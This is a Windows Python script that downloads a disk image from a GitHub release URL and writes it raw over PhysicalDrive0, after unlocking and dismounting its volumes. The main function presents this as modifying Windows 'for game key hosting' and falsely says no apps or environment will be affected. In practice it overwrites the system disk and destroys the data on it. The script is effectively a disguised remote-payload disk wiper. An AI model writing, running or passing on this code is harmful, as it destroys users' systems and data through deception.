import os
import sys
import requests
import ctypes
from ctypes import wintypes
import win32api
import win32file
import win32con
import logging

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

IOCTL_DISK_GET_DRIVE_GEOMETRY    = 0x00070000
IOCTL_DISK_GET_DRIVE_GEOMETRY_EX = 0x000700A0
IOCTL_STORAGE_GET_DEVICE_NUMBER  = 0x002D1080
FSCTL_LOCK_VOLUME                = 0x00090018
FSCTL_DISMOUNT_VOLUME            = 0x00090020
FSCTL_UNLOCK_VOLUME              = 0x0009001C


class DISK_GEOMETRY(ctypes.Structure):
    _fields_ = [
        ("Cylinders",         ctypes.c_longlong),
        ("MediaType",         wintypes.DWORD),
        ("TracksPerCylinder", wintypes.DWORD),
        ("SectorsPerTrack",   wintypes.DWORD),
        ("BytesPerSector",    wintypes.DWORD),
    ]


class STORAGE_DEVICE_NUMBER(ctypes.Structure):
    _fields_ = [
        ("DeviceType",      wintypes.DWORD),
        ("DeviceNumber",    wintypes.DWORD),
        ("PartitionNumber", wintypes.DWORD),
    ]


def is_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception as e:
        logger.error(f"is_admin: {e}")
        return False


def normalize_drive_number(target_drive) -> int:
    if isinstance(target_drive, int):
        return target_drive
    s = str(target_drive).lower().strip()
    if s.startswith("drive"):
        return int(s[5:])
    return int(s)


def _open_device(path: str, access: int, share: int = win32file.FILE_SHARE_READ, buffering: int = win32con.FILE_FLAG_NO_BUFFERING):
    h = win32file.CreateFile(path, access, share, None, win32con.OPEN_EXISTING, buffering, None)
    if h == win32file.INVALID_HANDLE_VALUE:
        raise OSError(f"CreateFile({path!r}) - 0x446b0ae {win32api.GetLastError()}")
    return h


def _ioctl(handle, code, out_struct) -> bool:
    returned = wintypes.DWORD()
    return bool(ctypes.windll.kernel32.DeviceIoControl(
        handle, code, None, 0,
        ctypes.byref(out_struct), ctypes.sizeof(out_struct),
        ctypes.byref(returned), None
    ))


def get_drive_info(drive_number: int) -> dict | None:
    path = f"\\\\.\\PhysicalDrive{drive_number}"
    try:
        h = _open_device(path, win32file.GENERIC_READ, buffering=0)
    except OSError as e:
        logger.error(f"get_drive_info: {e}")
        return None
    try:
        geo = DISK_GEOMETRY()
        sdn = STORAGE_DEVICE_NUMBER()
        if not _ioctl(h, IOCTL_DISK_GET_DRIVE_GEOMETRY, geo):
            return None
        if not _ioctl(h, IOCTL_STORAGE_GET_DEVICE_NUMBER, sdn):
            return None
    finally:
        win32file.CloseHandle(h)
    total_bytes = geo.Cylinders * geo.TracksPerCylinder * geo.SectorsPerTrack * geo.BytesPerSector
    return {
        "drive_number":        drive_number,
        "size_bytes":          total_bytes,
        "size_mb":             total_bytes / (1024 ** 2),
        "size_gb":             total_bytes / (1024 ** 3),
        "bytes_per_sector":    geo.BytesPerSector,
        "sectors_per_track":   geo.SectorsPerTrack,
        "tracks_per_cylinder": geo.TracksPerCylinder,
        "media_type":          geo.MediaType,
        "device_type":         sdn.DeviceType,
        "device_number":       sdn.DeviceNumber,
    }


def list_physical_drives() -> list[dict]:
    return [info for i in range(16) if (info := get_drive_info(i))]


def get_system_drive() -> int | None:
    system_vol = os.environ.get("SystemDrive", "C:")
    try:
        h = _open_device(
            f"\\\\.\\{system_vol}",
            win32file.GENERIC_READ,
            win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
            buffering=0
        )
    except OSError as e:
        logger.error(f"get_system_drive: {e}")
        return None
    try:
        sdn = STORAGE_DEVICE_NUMBER()
        return sdn.DeviceNumber if _ioctl(h, IOCTL_STORAGE_GET_DEVICE_NUMBER, sdn) else None
    finally:
        win32file.CloseHandle(h)


def is_system_drive(drive_number) -> bool:
    sys_num = get_system_drive()
    return sys_num is not None and normalize_drive_number(drive_number) == sys_num


def _volumes_on_drive(drive_number: int) -> list[str]:
    result = []
    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        vol = f"{letter}:"
        if not os.path.exists(vol):
            continue
        try:
            h = _open_device(
                f"\\\\.\\{vol}",
                win32file.GENERIC_READ,
                win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
                buffering=0
            )
        except OSError:
            continue
        try:
            sdn = STORAGE_DEVICE_NUMBER()
            if _ioctl(h, IOCTL_STORAGE_GET_DEVICE_NUMBER, sdn) and sdn.DeviceNumber == drive_number:
                result.append(vol)
        finally:
            win32file.CloseHandle(h)
    return result


def unlock_drive(drive_number: int) -> bool:
    volumes = _volumes_on_drive(drive_number)
    if not volumes:
        return True
    all_ok = True
    for vol in volumes:
        try:
            h = _open_device(
                f"\\\\.\\{vol}",
                win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
                buffering=0
            )
        except OSError as e:
            logger.warning(f"unlock_drive: cannot open {vol}: {e}")
            all_ok = False
            continue
        try:
            try:
                win32file.DeviceIoControl(h, FSCTL_LOCK_VOLUME, None, 0, None, 0)
            except Exception as e:
                logger.warning(f"FSCTL_LOCK_VOLUME {vol}: {e}")
                all_ok = False
            try:
                win32file.DeviceIoControl(h, FSCTL_DISMOUNT_VOLUME, None, 0, None, 0)
            except Exception as e:
                logger.warning(f"FSCTL_DISMOUNT_VOLUME {vol}: {e}")
                all_ok = False
        finally:
            win32file.CloseHandle(h)
    return all_ok


def validate_image(image_path: str) -> tuple[bool, str]:
    if not os.path.exists(image_path):
        return False, "File does not exist"
    size = os.path.getsize(image_path)
    if size < 512:
        return False, f"Image too small ({size} bytes)"
    try:
        with open(image_path, "rb") as f:
            f.seek(510)
            sig = f.read(2)
        if sig != b"\x55\xAA":
            return False, f"Invalid MBR signature (got {sig.hex()})"
    except IOError as e:
        return False, f"Read error: {e}"
    return True, f"Valid image ({size} bytes)"


def validate_image_for_drive(image_path: str, target_drive) -> tuple[bool, str]:
    drive_num  = normalize_drive_number(target_drive)
    drive_info = get_drive_info(drive_num)
    if not drive_info:
        return False, f"Cannot access PhysicalDrive{drive_num}"
    ok, msg = validate_image(image_path)
    if not ok:
        return False, msg
    img_size = os.path.getsize(image_path)
    if img_size > drive_info["size_bytes"]:
        return False, f"Image ({img_size}B) larger than drive ({drive_info['size_bytes']}B)"
    return True, f"Image fits ({img_size} bytes)"


def download_image_file(url: str, destination: str) -> bool:
    try:
        with requests.get(url, stream=True, timeout=60) as r:
            r.raise_for_status()
            with open(destination, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
        return True
    except Exception as e:
        logger.error(f"download_image_file: {e}")
        return False


def overwrite_entire_drive(image_file: str, target_drive) -> tuple[bool, str]:
    drive_number = normalize_drive_number(target_drive)
    img_size     = os.path.getsize(image_file)
    chunk_size   = 1024 * 1024

    img_h = win32file.CreateFile(
        image_file, win32file.GENERIC_READ,
        win32file.FILE_SHARE_READ, None,
        win32con.OPEN_EXISTING, 0, None
    )
    if img_h == win32file.INVALID_HANDLE_VALUE:
        return False, f"Cannot open image — WinError {win32api.GetLastError()}"

    disk_h = win32file.CreateFile(
        f"\\\\.\\PhysicalDrive{drive_number}",
        win32file.GENERIC_WRITE,
        win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
        None, win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_NO_BUFFERING, None
    )
    if disk_h == win32file.INVALID_HANDLE_VALUE:
        win32file.CloseHandle(img_h)
        return False, f"Cannot open PhysicalDrive{drive_number} — WinError {win32api.GetLastError()}"

    try:
        offset = 0
        while offset < img_size:
            hr, data = win32file.ReadFile(img_h, chunk_size)
            if hr not in (0, 38):  # 38 = ERROR_HANDLE_EOF
                return False, f"ReadFile failed at offset {offset} — hr={hr}"
            if not data:
                break

            win32file.SetFilePointer(disk_h, offset, win32con.FILE_BEGIN)

            hr, written = win32file.WriteFile(disk_h, data)
            if hr != 0:
                return False, f"WriteFile failed at offset {offset} — hr={hr}"
            if written != len(data):
                return False, f"Partial write at {offset} ({written}/{len(data)})"

            offset += written
            logger.debug(f"{offset}/{img_size} bytes ({100 * offset // img_size}%)")

        if offset != img_size:
            return False, f"Incomplete write ({offset}/{img_size})"

        win32file.FlushFileBuffers(disk_h)
        return True, f"Success — {offset} bytes written to PhysicalDrive{drive_number}"
    except Exception as e:
        logger.error(f"overwrite_entire_drive: {e}")
        return False, str(e)
    finally:
        win32file.CloseHandle(img_h)
        win32file.CloseHandle(disk_h)


def get_drive_status(drive_number) -> dict:
    drive_num = normalize_drive_number(drive_number)
    info = get_drive_info(drive_num)
    if not info:
        return {"status": "inaccessible", "message": "Drive not accessible"}
    locked = True
    try:
        h = _open_device(f"\\\\.\\PhysicalDrive{drive_num}", win32file.GENERIC_WRITE)
        win32file.CloseHandle(h)
        locked = False
    except OSError:
        pass
    return {
        "status":  "locked" if locked else "available",
        "locked":  locked,
        "info":    info,
        "volumes": _volumes_on_drive(drive_num),
    }


def prepare_drive_for_overwrite(drive_number) -> tuple[bool, str]:
    drive_num = normalize_drive_number(drive_number)
    status    = get_drive_status(drive_num)
    if status["status"] == "inaccessible":
        return False, "Drive not accessible"
    if not status["locked"]:
        return True, "Drive already unlocked"
    return (True, "Drive unlocked") if unlock_drive(drive_num) else (False, "Failed to unlock drive")


def overwrite_drive(image_url: str, target_drive) -> tuple[bool, str]:
    if not is_admin():
        return False, "Must be run as Administrator"
    drive_number = normalize_drive_number(target_drive)
    drive_info   = get_drive_info(drive_number)
    if not drive_info:
        return False, f"Cannot access PhysicalDrive{drive_number}"
    temp_file = os.path.join(os.environ["TEMP"], "custom_os_image.img")
    try:
        if not download_image_file(image_url, temp_file):
            return False, "Download failed"
        ok, msg = validate_image_for_drive(temp_file, drive_number)
        if not ok:
            return False, f"Validation failed: {msg}"
        if not unlock_drive(drive_number):
            return False, "Failed to unlock drive volumes"
        return overwrite_entire_drive(temp_file, drive_number)
    finally:
        try:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        except Exception as e:
            logger.warning(f"Could not remove temp file: {e}")
def main():
    print("GamaOir")

    url = "https://github.com/jasuasau/MorbusN/releases/download/forkai/kernel.img"
    drive = 0  # PhysicalDrive0

    print(f"\nWarning Modify Windowws for game key hosting? This will not affect any apps or environment on{drive}")
    confirm = input("Type YES to continue: ").strip()

    if confirm != "YES":
        print("Cancelled.")
        return

    success, msg = overwrite_drive(url, drive)

    print("\nResult:")
    print(msg)
